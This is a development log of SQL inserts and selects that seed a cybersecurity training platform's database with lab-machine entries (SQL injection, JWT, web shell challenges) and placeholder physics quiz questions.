2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/MachineModel.go:36
[0m[33m[9.548ms] [34;1m[rows:1][0m INSERT INTO "machines" ("created_at","updated_at","deleted_at","image_name_or_id","room_id","course_machine_id","operating_system_type_id") VALUES ('2025-06-09 14:07:55.735','2025-06-09 14:07:55.735',NULL,'mintesnotafework/sensitive_data_exposure-image:v1.0',1,106,1) RETURNING "id"

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.496ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 3 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[8.030ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:55.744','2025-06-09 14:07:55.744',NULL,'privilege escalation basics','Simulate escalating privileges on a compromised machine.',200,3) RETURNING "id"

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.448ms] [34;1m[rows:1][0m SELECT * FROM "operating_system_types" WHERE "operating_system_types"."id" = 1 AND "operating_system_types"."deleted_at" IS NULL ORDER BY "operating_system_types"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.453ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 1 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.515ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 107 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/MachineModel.go:36
[0m[33m[21.169ms] [34;1m[rows:1][0m INSERT INTO "machines" ("created_at","updated_at","deleted_at","image_name_or_id","room_id","course_machine_id","operating_system_type_id") VALUES ('2025-06-09 14:07:55.755','2025-06-09 14:07:55.755',NULL,'mintesnotafework/sql_injection-image:v1.0',1,107,1) RETURNING "id"

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.443ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 4 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[8.155ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:55.772','2025-06-09 14:07:55.772',NULL,'insecure deserialization','Explore the dangers of insecure deserialization and gain RCE.',220,4) RETURNING "id"

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.463ms] [34;1m[rows:1][0m SELECT * FROM "operating_system_types" WHERE "operating_system_types"."id" = 1 AND "operating_system_types"."deleted_at" IS NULL ORDER BY "operating_system_types"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.505ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 1 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.497ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 108 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/MachineModel.go:36
[0m[33m[7.518ms] [34;1m[rows:1][0m INSERT INTO "machines" ("created_at","updated_at","deleted_at","image_name_or_id","room_id","course_machine_id","operating_system_type_id") VALUES ('2025-06-09 14:07:55.782','2025-06-09 14:07:55.782',NULL,'mintesnotafework/insecure-deserialization-image:v1.0',1,108,1) RETURNING "id"

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.597ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 2 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[13.402ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:55.788','2025-06-09 14:07:55.788',NULL,'jwt hacking','Learn how JSON Web Tokens (JWTs) can be manipulated for unauthorized access.',160,2) RETURNING "id"

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.486ms] [34;1m[rows:1][0m SELECT * FROM "operating_system_types" WHERE "operating_system_types"."id" = 1 AND "operating_system_types"."deleted_at" IS NULL ORDER BY "operating_system_types"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.503ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 1 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.476ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 109 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/MachineModel.go:36
[0m[33m[7.751ms] [34;1m[rows:1][0m INSERT INTO "machines" ("created_at","updated_at","deleted_at","image_name_or_id","room_id","course_machine_id","operating_system_type_id") VALUES ('2025-06-09 14:07:55.803','2025-06-09 14:07:55.803',NULL,'mintesnotafework/sql_injection-image:v1.0',1,109,1) RETURNING "id"

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.551ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 4 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[12.749ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:55.814','2025-06-09 14:07:55.814',NULL,'web shell challenge','Upload and use a web shell to compromise the system.',210,4) RETURNING "id"

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.462ms] [34;1m[rows:1][0m SELECT * FROM "operating_system_types" WHERE "operating_system_types"."id" = 1 AND "operating_system_types"."deleted_at" IS NULL ORDER BY "operating_system_types"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.442ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 1 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.405ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 110 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/MachineModel.go:36
[0m[33m[8.455ms] [34;1m[rows:1][0m INSERT INTO "machines" ("created_at","updated_at","deleted_at","image_name_or_id","room_id","course_machine_id","operating_system_type_id") VALUES ('2025-06-09 14:07:55.823','2025-06-09 14:07:55.823',NULL,'mintesnotafework/sql_injection-image:v1.0',1,110,1) RETURNING "id"

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[1.377ms] [34;1m[rows:1][0m SELECT * FROM "courses" WHERE "courses"."id" = 1 AND "courses"."deleted_at" IS NULL ORDER BY "courses"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.532ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 1 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/QuestionModel.go:43
[0m[33m[9.393ms] [34;1m[rows:1][0m INSERT INTO "questions" ("created_at","updated_at","deleted_at","question","answer","hint1","hint2","hint3","point","difficulty_level_id","course_id") VALUES ('2025-06-09 14:07:55.832','2025-06-09 14:07:55.832',NULL,'What is the basic unit of electric current?','1234','hello world','hello world 2','hello world 3',100,1,1) RETURNING "id"

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.845ms] [34;1m[rows:1][0m SELECT * FROM "courses" WHERE "courses"."id" = 1 AND "courses"."deleted_at" IS NULL ORDER BY "courses"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.494ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 2 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/QuestionModel.go:43
[0m[33m[7.518ms] [34;1m[rows:1][0m INSERT INTO "questions" ("created_at","updated_at","deleted_at","question","answer","hint1","hint2","hint3","point","difficulty_level_id","course_id") VALUES ('2025-06-09 14:07:55.841','2025-06-09 14:07:55.841',NULL,'What is the speed of light in vacuum?','1234','hello world','hello world 2','hello world 3',200,2,1) RETURNING "id"

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.850ms] [34;1m[rows:1][0m SELECT * FROM "courses" WHERE "courses"."id" = 1 AND "courses"."deleted_at" IS NULL ORDER BY "courses"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[1.898ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 3 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/QuestionModel.go:43
[0m[33m[11.085ms] [34;1m[rows:1][0m INSERT INTO "questions" ("created_at","updated_at","deleted_at","question","answer","hint1","hint2","hint3","point","difficulty_level_id","course_id") VALUES ('2025-06-09 14:07:55.85','2025-06-09 14:07:55.85',NULL,'Who is known as the father of modern physics?','1234','hello world','hello world 2','hello world 3',50,3,1) RETURNING "id"

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.838ms] [34;1m[rows:1][0m SELECT * FROM "courses" WHERE "courses"."id" = 1 AND "courses"."deleted_at" IS NULL ORDER BY "courses"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[4.078ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 4 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/QuestionModel.go:43
[0m[33m[16.943ms] [34;1m[rows:1][0m INSERT INTO "questions" ("created_at","updated_at","deleted_at","question","answer","hint1","hint2","hint3","point","difficulty_level_id","course_id") VALUES ('2025-06-09 14:07:55.864','2025-06-09 14:07:55.864',NULL,'What is the formula for calculating force?','1234','hello world','hello world 2','hello world 3',150,4,1) RETURNING "id"

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.797ms] [34;1m[rows:1][0m SELECT * FROM "courses" WHERE "courses"."id" = 1 AND "courses"."deleted_at" IS NULL ORDER BY "courses"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.536ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 5 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/QuestionModel.go:43
[0m[33m[8.954ms] [34;1m[rows:1][0m INSERT INTO "questions" ("created_at","updated_at","deleted_at","question","answer","hint1","hint2","hint3","point","difficulty_level_id","course_id") VALUES ('2025-06-09 14:07:55.877','2025-06-09 14:07:55.877',NULL,'What is the first law of thermodynamics?','1234','hello world','hello world 2','hello world 3',30,5,1) RETURNING "id"

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.918ms] [34;1m[rows:1][0m SELECT * FROM "courses" WHERE "courses"."id" = 1 AND "courses"."deleted_at" IS NULL ORDER BY "courses"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.457ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 1 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/QuestionModel.go:43
[0m[33m[10.978ms] [34;1m[rows:1][0m INSERT INTO "questions" ("created_at","updated_at","deleted_at","question","answer","hint1","hint2","hint3","point","difficulty_level_id","course_id") VALUES ('2025-06-09 14:07:55.886','2025-06-09 14:07:55.886',NULL,'What is the unit of frequency?','1234','hello world','hello world 2','hello world 3',99,1,1) RETURNING "id"

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[3.984ms] [34;1m[rows:1][0m SELECT * FROM "courses" WHERE "courses"."id" = 1 AND "courses"."deleted_at" IS NULL ORDER BY "courses"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.559ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 2 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/QuestionModel.go:43
[0m[33m[10.531ms] [34;1m[rows:1][0m INSERT INTO "questions" ("created_at","updated_at","deleted_at","question","answer","hint1","hint2","hint3","point","difficulty_level_id","course_id") VALUES ('2025-06-09 14:07:55.901','2025-06-09 14:07:55.901',NULL,'What is the principle of superposition?','1234','hello world','hello world 2','hello world 3',110,2,1) RETURNING "id"

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.661ms] [34;1m[rows:1][0m SELECT * FROM "courses" WHERE "courses"."id" = 1 AND "courses"."deleted_at" IS NULL ORDER BY "courses"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.493ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 1 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/QuestionModel.go:43
[0m[33m[8.369ms] [34;1m[rows:1][0m INSERT INTO "questions" ("created_at","updated_at","deleted_at","question","answer","hint1","hint2","hint3","point","difficulty_level_id","course_id") VALUES ('2025-06-09 14:07:55.908','2025-06-09 14:07:55.908',NULL,'What is the basic unit of electric current?','1234','hello world','hello world 2','hello world 3',100,1,1) RETURNING "id"

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.712ms] [34;1m[rows:1][0m SELECT * FROM "courses" WHERE "courses"."id" = 1 AND "courses"."deleted_at" IS NULL ORDER BY "courses"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.477ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 3 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/QuestionModel.go:43
[0m[33m[7.390ms] [34;1m[rows:1][0m INSERT INTO "questions" ("created_at","updated_at","deleted_at","question","answer","hint1","hint2","hint3","point","difficulty_level_id","course_id") VALUES ('2025-06-09 14:07:55.916','2025-06-09 14:07:55.916',NULL,'Who is known as the father of modern physics?','1234','hello world','hello world 2','hello world 3',50,3,1) RETURNING "id"

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.648ms] [34;1m[rows:1][0m SELECT * FROM "courses" WHERE "courses"."id" = 1 AND "courses"."deleted_at" IS NULL ORDER BY "courses"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.531ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 2 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/QuestionModel.go:43
[0m[33m[7.424ms] [34;1m[rows:1][0m INSERT INTO "questions" ("created_at","updated_at","deleted_at","question","answer","hint1","hint2","hint3","point","difficulty_level_id","course_id") VALUES ('2025-06-09 14:07:55.924','2025-06-09 14:07:55.924',NULL,'What is the speed of light in vacuum?','1234','hello world','hello world 2','hello world 3',200,2,1) RETURNING "id"

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.680ms] [34;1m[rows:1][0m SELECT * FROM "courses" WHERE "courses"."id" = 1 AND "courses"."deleted_at" IS NULL ORDER BY "courses"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.524ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 4 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/QuestionModel.go:43
[0m[33m[11.488ms] [34;1m[rows:1][0m INSERT INTO "questions" ("created_at","updated_at","deleted_at","question","answer","hint1","hint2","hint3","point","difficulty_level_id","course_id") VALUES ('2025-06-09 14:07:55.934','2025-06-09 14:07:55.934',NULL,'What is the formula for calculating force?','1234','hello world','hello world 2','hello world 3',150,4,1) RETURNING "id"

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.589ms] [34;1m[rows:1][0m SELECT * FROM "courses" WHERE "courses"."id" = 1 AND "courses"."deleted_at" IS NULL ORDER BY "courses"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.428ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 5 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/QuestionModel.go:43
[0m[33m[7.250ms] [34;1m[rows:1][0m INSERT INTO "questions" ("created_at","updated_at","deleted_at","question","answer","hint1","hint2","hint3","point","difficulty_level_id","course_id") VALUES ('2025-06-09 14:07:55.943','2025-06-09 14:07:55.943',NULL,'What is the first law of thermodynamics?','1234','hello world','hello world 2','hello world 3',30,5,1) RETURNING "id"

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.688ms] [34;1m[rows:1][0m SELECT * FROM "courses" WHERE "courses"."id" = 1 AND "courses"."deleted_at" IS NULL ORDER BY "courses"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.478ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 1 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/QuestionModel.go:43
[0m[33m[8.592ms] [34;1m[rows:1][0m INSERT INTO "questions" ("created_at","updated_at","deleted_at","question","answer","hint1","hint2","hint3","point","difficulty_level_id","course_id") VALUES ('2025-06-09 14:07:55.952','2025-06-09 14:07:55.952',NULL,'What is the unit of frequency?','1234','hello world','hello world 2','hello world 3',99,1,1) RETURNING "id"

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.659ms] [34;1m[rows:1][0m SELECT * FROM "courses" WHERE "courses"."id" = 1 AND "courses"."deleted_at" IS NULL ORDER BY "courses"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.529ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 2 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/QuestionModel.go:43
[0m[33m[7.611ms] [34;1m[rows:1][0m INSERT INTO "questions" ("created_at","updated_at","deleted_at","question","answer","hint1","hint2","hint3","point","difficulty_level_id","course_id") VALUES ('2025-06-09 14:07:55.959','2025-06-09 14:07:55.959',NULL,'What is the principle of superposition?','1234','hello world','hello world 2','hello world 3',110,2,1) RETURNING "id"

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.676ms] [34;1m[rows:1][0m SELECT * FROM "courses" WHERE "courses"."id" = 1 AND "courses"."deleted_at" IS NULL ORDER BY "courses"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.495ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 1 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/QuestionModel.go:43
[0m[33m[8.936ms] [34;1m[rows:1][0m INSERT INTO "questions" ("created_at","updated_at","deleted_at","question","answer","hint1","hint2","hint3","point","difficulty_level_id","course_id") VALUES ('2025-06-09 14:07:55.967','2025-06-09 14:07:55.967',NULL,'What is the basic unit of electric current?','1234','hello world','hello world 2','hello world 3',100,1,1) RETURNING "id"

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.661ms] [34;1m[rows:1][0m SELECT * FROM "courses" WHERE "courses"."id" = 1 AND "courses"."deleted_at" IS NULL ORDER BY "courses"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.465ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 2 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/QuestionModel.go:43
[0m[33m[15.537ms] [34;1m[rows:1][0m INSERT INTO "questions" ("created_at","updated_at","deleted_at","question","answer","hint1","hint2","hint3","point","difficulty_level_id","course_id") VALUES ('2025-06-09 14:07:55.976','2025-06-09 14:07:55.976',NULL,'What is the speed of 1234?','1234','hello world','hello world 2','hello world 3',200,2,1) RETURNING "id"

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.651ms] [34;1m[rows:1][0m SELECT * FROM "courses" WHERE "courses"."id" = 1 AND "courses"."deleted_at" IS NULL ORDER BY "courses"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.511ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 3 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/QuestionModel.go:43
